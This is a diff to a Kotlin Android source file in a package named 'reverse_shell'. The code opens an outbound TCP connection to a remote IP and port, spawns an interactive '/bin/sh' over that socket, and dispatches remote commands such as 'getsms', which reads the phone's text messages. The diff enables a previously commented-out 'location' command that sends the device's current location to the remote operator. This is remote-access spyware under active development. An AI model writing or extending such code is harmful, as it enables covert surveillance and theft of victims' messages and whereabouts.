@@ -1,6 +1,8 @@
 package com.ironclad.saksham.reverse_shell
 
 import android.content.Context
+import android.os.Build
+import androidx.annotation.RequiresApi
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
@@ -58,6 +60,7 @@ suspend fun establishReverseTcp(ip: String, port: Int,retryInterval:Long, contex
  * @param socket The connected socket used for communication with the remote shell.
  * @param context The application context, used for accessing resources or system services if needed.
  */
+@RequiresApi(Build.VERSION_CODES.P)
 private suspend fun handleShellInteraction(socket: Socket, context: Context)= withContext(Dispatchers.IO){
 
     val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))
@@ -103,6 +106,7 @@ private suspend fun handleShellInteraction(socket: Socket, context: Context)= wi
  * @param process The shell process.
  * @param context The application context, used for accessing resources or system services if needed.
  */
+@RequiresApi(Build.VERSION_CODES.P)
 private suspend fun executeCommand(
     command: String,
     socketOutput: OutputStream,
@@ -118,7 +122,7 @@ private suspend fun executeCommand(
         "help" -> CommandHandler.handleHelp(socketOutput, shellOutput)
         "getsms" -> CommandHandler.handleGetSms(socketOutput, context, shellOutput)
         "exit" -> CommandHandler.handleExit(socket, process)
-//        "location"-> CommandHandler.handleCurrentLocation(context, socketOutput, shellOutput)
+        "location"-> CommandHandler.handleCurrentLocation(context, socketOutput, shellOutput)
         else -> {
             if (command.startsWith("download")) {
 //                CommandHandler.handleDownload(command, socketOutput, socketInput)
